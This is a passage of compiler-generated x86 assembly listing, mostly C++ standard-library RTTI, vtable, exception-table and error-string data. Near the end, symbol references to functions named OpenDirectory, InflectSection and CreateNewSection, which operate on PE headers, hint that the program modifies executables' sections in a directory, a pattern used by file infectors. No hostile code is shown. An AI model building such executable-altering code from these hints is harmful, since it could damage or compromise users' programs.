CONST	ENDS
;	COMDAT ??_C@_13BBDEGPLJ@?$AA?$CK@
CONST	SEGMENT
??_C@_13BBDEGPLJ@?$AA?$CK@ DB '*', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0BI@LBKDNGFK@directory_entry?3?3status@
CONST	SEGMENT
??_C@_0BI@LBKDNGFK@directory_entry?3?3status@ DB 'directory_entry::status'
	DB	00H						; `string'
CONST	ENDS
;	COMDAT __CT??_R0?AVfilesystem_error@filesystem@std@@@8??0filesystem_error@filesystem@std@@QAE@ABV012@@Z92
xdata$x	SEGMENT
__CT??_R0?AVfilesystem_error@filesystem@std@@@8??0filesystem_error@filesystem@std@@QAE@ABV012@@Z92 DD 00H
	DD	FLAT:??_R0?AVfilesystem_error@filesystem@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	05cH
	DD	FLAT:??0filesystem_error@filesystem@std@@QAE@ABV012@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVfilesystem_error@filesystem@std@@@8
data$r	SEGMENT
??_R0?AVfilesystem_error@filesystem@std@@@8 DD FLAT:??_7type_info@@6B@ ; std::filesystem::filesystem_error `RTTI Type Descriptor'
	DD	00H
	DB	'.?AVfilesystem_error@filesystem@std@@', 00H
data$r	ENDS
;	COMDAT __CTA5?AVfilesystem_error@filesystem@std@@
xdata$x	SEGMENT
__CTA5?AVfilesystem_error@filesystem@std@@ DD 05H
	DD	FLAT:__CT??_R0?AVfilesystem_error@filesystem@std@@@8??0filesystem_error@filesystem@std@@QAE@ABV012@@Z92
	DD	FLAT:__CT??_R0?AVsystem_error@std@@@8??0system_error@std@@QAE@ABV01@@Z20
	DD	FLAT:__CT??_R0?AV_System_error@std@@@8??0_System_error@std@@QAE@ABV01@@Z20
	DD	FLAT:__CT??_R0?AVruntime_error@std@@@8??0runtime_error@std@@QAE@ABV01@@Z12
	DD	FLAT:__CT??_R0?AVexception@std@@@8??0exception@std@@QAE@ABV01@@Z12
xdata$x	ENDS
;	COMDAT __TI5?AVfilesystem_error@filesystem@std@@
xdata$x	SEGMENT
__TI5?AVfilesystem_error@filesystem@std@@ DD 00H
	DD	FLAT:??1filesystem_error@filesystem@std@@UAE@XZ
	DD	00H
	DD	FLAT:__CTA5?AVfilesystem_error@filesystem@std@@
xdata$x	ENDS
;	COMDAT ??_C@_04PHMHGEMA@?$CC?0?5?$CC@
CONST	SEGMENT
??_C@_04PHMHGEMA@?$CC?0?5?$CC@ DB '", "', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_03NONCDIOG@?3?5?$CC@
CONST	SEGMENT
??_C@_03NONCDIOG@?3?5?$CC@ DB ': "', 00H		; `string'
CONST	ENDS
;	COMDAT ??_7filesystem_error@filesystem@std@@6B@
CONST	SEGMENT
??_7filesystem_error@filesystem@std@@6B@ DD FLAT:??_R4filesystem_error@filesystem@std@@6B@ ; std::filesystem::filesystem_error::`vftable'
	DD	FLAT:??_Efilesystem_error@filesystem@std@@UAEPAXI@Z
	DD	FLAT:?what@filesystem_error@filesystem@std@@UBEPBDXZ
CONST	ENDS
;	COMDAT ?_Is_slash@filesystem@std@@3U_Is_slash_oper@12@B
CONST	SEGMENT
?_Is_slash@filesystem@std@@3U_Is_slash_oper@12@B	ORG $+1 ; std::filesystem::_Is_slash
CONST	ENDS
;	COMDAT __CT??_R0?AVfailure@ios_base@std@@@8??0failure@ios_base@std@@QAE@ABV012@@Z20
xdata$x	SEGMENT
__CT??_R0?AVfailure@ios_base@std@@@8??0failure@ios_base@std@@QAE@ABV012@@Z20 DD 00H
	DD	FLAT:??_R0?AVfailure@ios_base@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	014H
	DD	FLAT:??0failure@ios_base@std@@QAE@ABV012@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVfailure@ios_base@std@@@8
data$r	SEGMENT
??_R0?AVfailure@ios_base@std@@@8 DD FLAT:??_7type_info@@6B@ ; std::ios_base::failure `RTTI Type Descriptor'
	DD	00H
	DB	'.?AVfailure@ios_base@std@@', 00H
data$r	ENDS
;	COMDAT __CTA5?AVfailure@ios_base@std@@
xdata$x	SEGMENT
__CTA5?AVfailure@ios_base@std@@ DD 05H
	DD	FLAT:__CT??_R0?AVfailure@ios_base@std@@@8??0failure@ios_base@std@@QAE@ABV012@@Z20
	DD	FLAT:__CT??_R0?AVsystem_error@std@@@8??0system_error@std@@QAE@ABV01@@Z20
	DD	FLAT:__CT??_R0?AV_System_error@std@@@8??0_System_error@std@@QAE@ABV01@@Z20
	DD	FLAT:__CT??_R0?AVruntime_error@std@@@8??0runtime_error@std@@QAE@ABV01@@Z12
	DD	FLAT:__CT??_R0?AVexception@std@@@8??0exception@std@@QAE@ABV01@@Z12
xdata$x	ENDS
;	COMDAT __TI5?AVfailure@ios_base@std@@
xdata$x	SEGMENT
__TI5?AVfailure@ios_base@std@@ DD 00H
	DD	FLAT:??1failure@ios_base@std@@UAE@XZ
	DD	00H
	DD	FLAT:__CTA5?AVfailure@ios_base@std@@
xdata$x	ENDS
;	COMDAT ??_C@_0BF@OOHOMBOF@ios_base?3?3eofbit?5set@
CONST	SEGMENT
??_C@_0BF@OOHOMBOF@ios_base?3?3eofbit?5set@ DB 'ios_base::eofbit set', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BG@FMKFHCIL@ios_base?3?3failbit?5set@
CONST	SEGMENT
??_C@_0BG@FMKFHCIL@ios_base?3?3failbit?5set@ DB 'ios_base::failbit set', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BF@PHHKMMFD@ios_base?3?3badbit?5set@
CONST	SEGMENT
??_C@_0BF@PHHKMMFD@ios_base?3?3badbit?5set@ DB 'ios_base::badbit set', 00H ; `string'
CONST	ENDS
;	COMDAT ??_7failure@ios_base@std@@6B@
CONST	SEGMENT
??_7failure@ios_base@std@@6B@ DD FLAT:??_R4failure@ios_base@std@@6B@ ; std::ios_base::failure::`vftable'
	DD	FLAT:??_Efailure@ios_base@std@@UAEPAXI@Z
	DD	FLAT:?what@exception@std@@UBEPBDXZ
CONST	ENDS
;	COMDAT ??_7?$ctype@D@std@@6B@
CONST	SEGMENT
??_7?$ctype@D@std@@6B@ DD FLAT:??_R4?$ctype@D@std@@6B@	; std::ctype<char>::`vftable'
	DD	FLAT:??_E?$ctype@D@std@@MAEPAXI@Z
	DD	FLAT:?_Incref@facet@locale@std@@UAEXXZ
	DD	FLAT:?_Decref@facet@locale@std@@UAEPAV_Facet_base@3@XZ
	DD	FLAT:?do_tolower@?$ctype@D@std@@MBEPBDPADPBD@Z
	DD	FLAT:?do_tolower@?$ctype@D@std@@MBEDD@Z
	DD	FLAT:?do_toupper@?$ctype@D@std@@MBEPBDPADPBD@Z
	DD	FLAT:?do_toupper@?$ctype@D@std@@MBEDD@Z
	DD	FLAT:?do_widen@?$ctype@D@std@@MBEPBDPBD0PAD@Z
	DD	FLAT:?do_widen@?$ctype@D@std@@MBEDD@Z
	DD	FLAT:?do_narrow@?$ctype@D@std@@MBEPBDPBD0DPAD@Z
	DD	FLAT:?do_narrow@?$ctype@D@std@@MBEDDD@Z
CONST	ENDS
;	COMDAT ??_7ctype_base@std@@6B@
CONST	SEGMENT
??_7ctype_base@std@@6B@ DD FLAT:??_R4ctype_base@std@@6B@ ; std::ctype_base::`vftable'
	DD	FLAT:??_Ectype_base@std@@UAEPAXI@Z
	DD	FLAT:?_Incref@facet@locale@std@@UAEXXZ
	DD	FLAT:?_Decref@facet@locale@std@@UAEPAV_Facet_base@3@XZ
CONST	ENDS
;	COMDAT ??_C@_00CNPNBAHC@@
CONST	SEGMENT
??_C@_00CNPNBAHC@@ DB 00H				; `string'
CONST	ENDS
;	COMDAT ??_7facet@locale@std@@6B@
CONST	SEGMENT
??_7facet@locale@std@@6B@ DD FLAT:??_R4facet@locale@std@@6B@ ; std::locale::facet::`vftable'
	DD	FLAT:??_Efacet@locale@std@@MAEPAXI@Z
	DD	FLAT:?_Incref@facet@locale@std@@UAEXXZ
	DD	FLAT:?_Decref@facet@locale@std@@UAEPAV_Facet_base@3@XZ
CONST	ENDS
;	COMDAT ??_C@_0BA@ELKIONDK@bad?5locale?5name@
CONST	SEGMENT
??_C@_0BA@ELKIONDK@bad?5locale?5name@ DB 'bad locale name', 00H ; `string'
CONST	ENDS
;	COMDAT ??_7_Facet_base@std@@6B@
CONST	SEGMENT
??_7_Facet_base@std@@6B@ DD FLAT:??_R4_Facet_base@std@@6B@ ; std::_Facet_base::`vftable'
	DD	FLAT:??_E_Facet_base@std@@UAEPAXI@Z
	DD	FLAT:__purecall
	DD	FLAT:__purecall
CONST	ENDS
;	COMDAT __CT??_R0?AVbad_cast@std@@@8??0bad_cast@std@@QAE@ABV01@@Z12
xdata$x	SEGMENT
__CT??_R0?AVbad_cast@std@@@8??0bad_cast@std@@QAE@ABV01@@Z12 DD 00H
	DD	FLAT:??_R0?AVbad_cast@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	0cH
	DD	FLAT:??0bad_cast@std@@QAE@ABV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVbad_cast@std@@@8
data$r	SEGMENT
??_R0?AVbad_cast@std@@@8 DD FLAT:??_7type_info@@6B@	; std::bad_cast `RTTI Type Descriptor'
	DD	00H
	DB	'.?AVbad_cast@std@@', 00H
data$r	ENDS
;	COMDAT __CTA2?AVbad_cast@std@@
xdata$x	SEGMENT
__CTA2?AVbad_cast@std@@ DD 02H
	DD	FLAT:__CT??_R0?AVbad_cast@std@@@8??0bad_cast@std@@QAE@ABV01@@Z12
	DD	FLAT:__CT??_R0?AVexception@std@@@8??0exception@std@@QAE@ABV01@@Z12
xdata$x	ENDS
;	COMDAT __TI2?AVbad_cast@std@@
xdata$x	SEGMENT
__TI2?AVbad_cast@std@@ DD 00H
	DD	FLAT:??1bad_cast@std@@UAE@XZ
	DD	00H
	DD	FLAT:__CTA2?AVbad_cast@std@@
xdata$x	ENDS
;	COMDAT ??_C@_08EPJLHIJG@bad?5cast@
CONST	SEGMENT
??_C@_08EPJLHIJG@bad?5cast@ DB 'bad cast', 00H		; `string'
CONST	ENDS
;	COMDAT ??_7bad_cast@std@@6B@
CONST	SEGMENT
??_7bad_cast@std@@6B@ DD FLAT:??_R4bad_cast@std@@6B@	; std::bad_cast::`vftable'
	DD	FLAT:??_Ebad_cast@std@@UAEPAXI@Z
	DD	FLAT:?what@exception@std@@UBEPBDXZ
CONST	ENDS
;	COMDAT ?_Unknown_error@?4??message@_System_error_category@std@@UBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@3@H@Z@4QBDB
CONST	SEGMENT
?_Unknown_error@?4??message@_System_error_category@std@@UBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@3@H@Z@4QBDB DB 075H ; `std::_System_error_category::message'::`5'::_Unknown_error
	DB	06eH
	DB	06bH
	DB	06eH
	DB	06fH
	DB	077H
	DB	06eH
	DB	020H
	DB	065H
	DB	072H
	DB	072H
	DB	06fH
	DB	072H
	DB	00H
CONST	ENDS
;	COMDAT ??_C@_06FHFOAHML@system@
CONST	SEGMENT
??_C@_06FHFOAHML@system@ DB 'system', 00H		; `string'
CONST	ENDS
;	COMDAT ??_7_System_error_category@std@@6B@
CONST	SEGMENT
??_7_System_error_category@std@@6B@ DD FLAT:??_R4_System_error_category@std@@6B@ ; std::_System_error_category::`vftable'
	DD	FLAT:??_E_System_error_category@std@@UAEPAXI@Z
	DD	FLAT:?name@_System_error_category@std@@UBEPBDXZ
	DD	FLAT:?message@_System_error_category@std@@UBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@H@Z
	DD	FLAT:?default_error_condition@_System_error_category@std@@UBE?AVerror_condition@2@H@Z
	DD	FLAT:?equivalent@error_category@std@@UBE_NABVerror_code@2@H@Z
	DD	FLAT:?equivalent@error_category@std@@UBE_NHABVerror_condition@2@@Z
CONST	ENDS
;	COMDAT ?_Iostream_error@?4??message@_Iostream_error_category2@std@@UBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@3@H@Z@4QBDB
CONST	SEGMENT
?_Iostream_error@?4??message@_Iostream_error_category2@std@@UBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@3@H@Z@4QBDB DB 069H ; `std::_Iostream_error_category2::message'::`5'::_Iostream_error
	DB	06fH
	DB	073H
	DB	074H
	DB	072H
	DB	065H
	DB	061H
	DB	06dH
	DB	020H
	DB	073H
	DB	074H
	DB	072H
	DB	065H
	DB	061H
	DB	06dH
	DB	020H
	DB	065H
	DB	072H
	DB	072H
	DB	06fH
	DB	072H
	DB	00H
CONST	ENDS
;	COMDAT ??_C@_08LLGCOLLL@iostream@
CONST	SEGMENT
??_C@_08LLGCOLLL@iostream@ DB 'iostream', 00H		; `string'
CONST	ENDS
;	COMDAT ??_7_Iostream_error_category2@std@@6B@
CONST	SEGMENT
??_7_Iostream_error_category2@std@@6B@ DD FLAT:??_R4_Iostream_error_category2@std@@6B@ ; std::_Iostream_error_category2::`vftable'
	DD	FLAT:??_E_Iostream_error_category2@std@@UAEPAXI@Z
	DD	FLAT:?name@_Iostream_error_category2@std@@UBEPBDXZ
	DD	FLAT:?message@_Iostream_error_category2@std@@UBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@H@Z
	DD	FLAT:?default_error_condition@error_category@std@@UBE?AVerror_condition@2@H@Z
	DD	FLAT:?equivalent@error_category@std@@UBE_NABVerror_code@2@H@Z
	DD	FLAT:?equivalent@error_category@std@@UBE_NHABVerror_condition@2@@Z
CONST	ENDS
;	COMDAT ??_C@_07DCLBNMLN@generic@
CONST	SEGMENT
??_C@_07DCLBNMLN@generic@ DB 'generic', 00H		; `string'
CONST	ENDS
;	COMDAT ??_7_Generic_error_category@std@@6B@
CONST	SEGMENT
??_7_Generic_error_category@std@@6B@ DD FLAT:??_R4_Generic_error_category@std@@6B@ ; std::_Generic_error_category::`vftable'
	DD	FLAT:??_E_Generic_error_category@std@@UAEPAXI@Z
	DD	FLAT:?name@_Generic_error_category@std@@UBEPBDXZ
	DD	FLAT:?message@_Generic_error_category@std@@UBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@H@Z
	DD	FLAT:?default_error_condition@error_category@std@@UBE?AVerror_condition@2@H@Z
	DD	FLAT:?equivalent@error_category@std@@UBE_NABVerror_code@2@H@Z
	DD	FLAT:?equivalent@error_category@std@@UBE_NHABVerror_condition@2@@Z
CONST	ENDS
;	COMDAT __CT??_R0?AV_System_error@std@@@8??0_System_error@std@@QAE@ABV01@@Z20
xdata$x	SEGMENT
__CT??_R0?AV_System_error@std@@@8??0_System_error@std@@QAE@ABV01@@Z20 DD 00H
	DD	FLAT:??_R0?AV_System_error@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	014H
	DD	FLAT:??0_System_error@std@@QAE@ABV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AV_System_error@std@@@8
data$r	SEGMENT
??_R0?AV_System_error@std@@@8 DD FLAT:??_7type_info@@6B@ ; std::_System_error `RTTI Type Descriptor'
	DD	00H
	DB	'.?AV_System_error@std@@', 00H
data$r	ENDS
;	COMDAT __CT??_R0?AVsystem_error@std@@@8??0system_error@std@@QAE@ABV01@@Z20
xdata$x	SEGMENT
__CT??_R0?AVsystem_error@std@@@8??0system_error@std@@QAE@ABV01@@Z20 DD 00H
	DD	FLAT:??_R0?AVsystem_error@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	014H
	DD	FLAT:??0system_error@std@@QAE@ABV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVsystem_error@std@@@8
data$r	SEGMENT
??_R0?AVsystem_error@std@@@8 DD FLAT:??_7type_info@@6B@	; std::system_error `RTTI Type Descriptor'
	DD	00H
	DB	'.?AVsystem_error@std@@', 00H
data$r	ENDS
;	COMDAT __CTA4?AVsystem_error@std@@
xdata$x	SEGMENT
__CTA4?AVsystem_error@std@@ DD 04H
	DD	FLAT:__CT??_R0?AVsystem_error@std@@@8??0system_error@std@@QAE@ABV01@@Z20
	DD	FLAT:__CT??_R0?AV_System_error@std@@@8??0_System_error@std@@QAE@ABV01@@Z20
	DD	FLAT:__CT??_R0?AVruntime_error@std@@@8??0runtime_error@std@@QAE@ABV01@@Z12
	DD	FLAT:__CT??_R0?AVexception@std@@@8??0exception@std@@QAE@ABV01@@Z12
xdata$x	ENDS
;	COMDAT __TI4?AVsystem_error@std@@
xdata$x	SEGMENT
__TI4?AVsystem_error@std@@ DD 00H
	DD	FLAT:??1system_error@std@@UAE@XZ
	DD	00H
	DD	FLAT:__CTA4?AVsystem_error@std@@
xdata$x	ENDS
;	COMDAT ??_7system_error@std@@6B@
CONST	SEGMENT
??_7system_error@std@@6B@ DD FLAT:??_R4system_error@std@@6B@ ; std::system_error::`vftable'
	DD	FLAT:??_Esystem_error@std@@UAEPAXI@Z
	DD	FLAT:?what@exception@std@@UBEPBDXZ
CONST	ENDS
;	COMDAT ??_C@_02LMMGGCAJ@?3?5@
CONST	SEGMENT
??_C@_02LMMGGCAJ@?3?5@ DB ': ', 00H			; `string'
CONST	ENDS
;	COMDAT ??_7_System_error@std@@6B@
CONST	SEGMENT
??_7_System_error@std@@6B@ DD FLAT:??_R4_System_error@std@@6B@ ; std::_System_error::`vftable'
	DD	FLAT:??_E_System_error@std@@UAEPAXI@Z
	DD	FLAT:?what@exception@std@@UBEPBDXZ
CONST	ENDS
;	COMDAT __CT??_R0?AVruntime_error@std@@@8??0runtime_error@std@@QAE@ABV01@@Z12
xdata$x	SEGMENT
__CT??_R0?AVruntime_error@std@@@8??0runtime_error@std@@QAE@ABV01@@Z12 DD 00H
	DD	FLAT:??_R0?AVruntime_error@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	0cH
	DD	FLAT:??0runtime_error@std@@QAE@ABV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVruntime_error@std@@@8
data$r	SEGMENT
??_R0?AVruntime_error@std@@@8 DD FLAT:??_7type_info@@6B@ ; std::runtime_error `RTTI Type Descriptor'
	DD	00H
	DB	'.?AVruntime_error@std@@', 00H
data$r	ENDS
;	COMDAT ??_7runtime_error@std@@6B@
CONST	SEGMENT
??_7runtime_error@std@@6B@ DD FLAT:??_R4runtime_error@std@@6B@ ; std::runtime_error::`vftable'
	DD	FLAT:??_Eruntime_error@std@@UAEPAXI@Z
	DD	FLAT:?what@exception@std@@UBEPBDXZ
CONST	ENDS
;	COMDAT ??_C@_0BA@JFNIOLAK@string?5too?5long@
CONST	SEGMENT
??_C@_0BA@JFNIOLAK@string?5too?5long@ DB 'string too long', 00H ; `string'
CONST	ENDS
;	COMDAT ?_Fake_alloc@std@@3U_Fake_allocator@1@B
CONST	SEGMENT
?_Fake_alloc@std@@3U_Fake_allocator@1@B	ORG $+1		; std::_Fake_alloc
CONST	ENDS
;	COMDAT __CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QAE@ABV01@@Z12
xdata$x	SEGMENT
__CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QAE@ABV01@@Z12 DD 010H
	DD	FLAT:??_R0?AVbad_alloc@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	0cH
	DD	FLAT:??0bad_alloc@std@@QAE@ABV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVbad_alloc@std@@@8
data$r	SEGMENT
??_R0?AVbad_alloc@std@@@8 DD FLAT:??_7type_info@@6B@	; std::bad_alloc `RTTI Type Descriptor'
	DD	00H
	DB	'.?AVbad_alloc@std@@', 00H
data$r	ENDS
;	COMDAT __CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QAE@ABV01@@Z12
xdata$x	SEGMENT
__CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QAE@ABV01@@Z12 DD 00H
	DD	FLAT:??_R0?AVbad_array_new_length@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	0cH
	DD	FLAT:??0bad_array_new_length@std@@QAE@ABV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVbad_array_new_length@std@@@8
data$r	SEGMENT
??_R0?AVbad_array_new_length@std@@@8 DD FLAT:??_7type_info@@6B@ ; std::bad_array_new_length `RTTI Type Descriptor'
	DD	00H
	DB	'.?AVbad_array_new_length@std@@', 00H
data$r	ENDS
;	COMDAT __CTA3?AVbad_array_new_length@std@@
xdata$x	SEGMENT
__CTA3?AVbad_array_new_length@std@@ DD 03H
	DD	FLAT:__CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QAE@ABV01@@Z12
	DD	FLAT:__CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QAE@ABV01@@Z12
	DD	FLAT:__CT??_R0?AVexception@std@@@8??0exception@std@@QAE@ABV01@@Z12
xdata$x	ENDS
;	COMDAT __TI3?AVbad_array_new_length@std@@
xdata$x	SEGMENT
__TI3?AVbad_array_new_length@std@@ DD 00H
	DD	FLAT:??1bad_array_new_length@std@@UAE@XZ
	DD	00H
	DD	FLAT:__CTA3?AVbad_array_new_length@std@@
xdata$x	ENDS
;	COMDAT __CT??_R0?AVexception@std@@@8??0exception@std@@QAE@ABV01@@Z12
xdata$x	SEGMENT
__CT??_R0?AVexception@std@@@8??0exception@std@@QAE@ABV01@@Z12 DD 00H
	DD	FLAT:??_R0?AVexception@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	0cH
	DD	FLAT:??0exception@std@@QAE@ABV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVexception@std@@@8
data$r	SEGMENT
??_R0?AVexception@std@@@8 DD FLAT:??_7type_info@@6B@	; std::exception `RTTI Type Descriptor'
	DD	00H
	DB	'.?AVexception@std@@', 00H
data$r	ENDS
;	COMDAT ??_C@_0BF@KINCDENJ@bad?5array?5new?5length@
CONST	SEGMENT
??_C@_0BF@KINCDENJ@bad?5array?5new?5length@ DB 'bad array new length', 00H ; `string'
CONST	ENDS
;	COMDAT ??_7bad_array_new_length@std@@6B@
CONST	SEGMENT
??_7bad_array_new_length@std@@6B@ DD FLAT:??_R4bad_array_new_length@std@@6B@ ; std::bad_array_new_length::`vftable'
	DD	FLAT:??_Ebad_array_new_length@std@@UAEPAXI@Z
	DD	FLAT:?what@exception@std@@UBEPBDXZ
CONST	ENDS
;	COMDAT ??_7bad_alloc@std@@6B@
CONST	SEGMENT
??_7bad_alloc@std@@6B@ DD FLAT:??_R4bad_alloc@std@@6B@	; std::bad_alloc::`vftable'
	DD	FLAT:??_Ebad_alloc@std@@UAEPAXI@Z
	DD	FLAT:?what@exception@std@@UBEPBDXZ
CONST	ENDS
;	COMDAT ??_C@_0BC@EOODALEL@Unknown?5exception@
CONST	SEGMENT
??_C@_0BC@EOODALEL@Unknown?5exception@ DB 'Unknown exception', 00H ; `string'
CONST	ENDS
;	COMDAT ??_7exception@std@@6B@
CONST	SEGMENT
??_7exception@std@@6B@ DD FLAT:??_R4exception@std@@6B@	; std::exception::`vftable'
	DD	FLAT:??_Eexception@std@@UAEPAXI@Z
	DD	FLAT:?what@exception@std@@UBEPBDXZ
CONST	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	09H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__catchsym$??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z$2 DD 00H
	DD	00H
	DD	00H
	DD	FLAT:__catch$??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z$0
__unwindtable$??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z DD 0ffffffffH
	DD	00H
	DD	0ffffffffH
	DD	00H
__tryblocktable$??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z DD 00H
	DD	00H
	DD	01H
	DD	01H
	DD	FLAT:__catchsym$??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z$2
__ehfuncinfo$??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z DD 019930522H
	DD	02H
	DD	FLAT:__unwindtable$??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z
	DD	01H
	DD	FLAT:__tryblocktable$??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z
	DD	2 DUP(00H)
	DD	00H
	DD	00H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	09H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__catchsym$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@XZ$2 DD 00H
	DD	00H
	DD	00H
	DD	FLAT:__catch$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@XZ$0
__unwindtable$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@XZ DD 0ffffffffH
	DD	00H
	DD	0ffffffffH
	DD	00H
__tryblocktable$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@XZ DD 00H
	DD	00H
	DD	01H
	DD	01H
	DD	FLAT:__catchsym$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@XZ$2
__ehfuncinfo$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@XZ DD 019930522H
	DD	02H
	DD	FLAT:__unwindtable$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@XZ
	DD	01H
	DD	FLAT:__tryblocktable$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@XZ
	DD	2 DUP(00H)
	DD	00H
	DD	00H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	09H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__catchsym$?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@D@Z$2 DD 00H
	DD	00H
	DD	00H
	DD	FLAT:__catch$?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@D@Z$0
__unwindtable$?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@D@Z DD 0ffffffffH
	DD	00H
	DD	0ffffffffH
	DD	00H
__tryblocktable$?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@D@Z DD 00H
	DD	00H
	DD	01H
	DD	01H
	DD	FLAT:__catchsym$?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@D@Z$2
__ehfuncinfo$?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@D@Z DD 019930522H
	DD	02H
	DD	FLAT:__unwindtable$?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@D@Z
	DD	01H
	DD	FLAT:__tryblocktable$?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@D@Z
	DD	2 DUP(00H)
	DD	00H
	DD	00H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	09H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__catchsym$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ$2 DD 00H
	DD	00H
	DD	00H
	DD	FLAT:__catch$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ$0
__unwindtable$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ DD 0ffffffffH
	DD	00H
	DD	0ffffffffH
	DD	00H
__tryblocktable$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ DD 00H
	DD	00H
	DD	01H
	DD	01H
	DD	FLAT:__catchsym$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ$2
__ehfuncinfo$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ DD 019930522H
	DD	02H
	DD	FLAT:__unwindtable$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ
	DD	01H
	DD	FLAT:__tryblocktable$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ
	DD	2 DUP(00H)
	DD	00H
	DD	00H
xdata$x	ENDS
voltbl	SEGMENT
_volmd	DD	0ffffffffH
	DDSymXIndex: 	FLAT:?OpenDirectory@@YA_NPBD@Z
	DD	010H
	DD	01dbH
_volmd	DD	0ffffffffH
	DDSymXIndex: 	FLAT:?InflectSection@@YA_NAAPAXPAU_IMAGE_NT_HEADERS@@PAEKK@Z
	DD	010H
	DD	0352H
_volmd	DD	0ffffffffH
	DDSymXIndex: 	FLAT:?CreateNewSection@@YA_NAAPAXAAPAU_IMAGE_NT_HEADERS@@PAEAAK3K@Z
	DD	0dH
	DD	0269H
voltbl	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	010H
	DB	07fH
voltbl	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	0dH
	DB	05cH
voltbl	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	010H
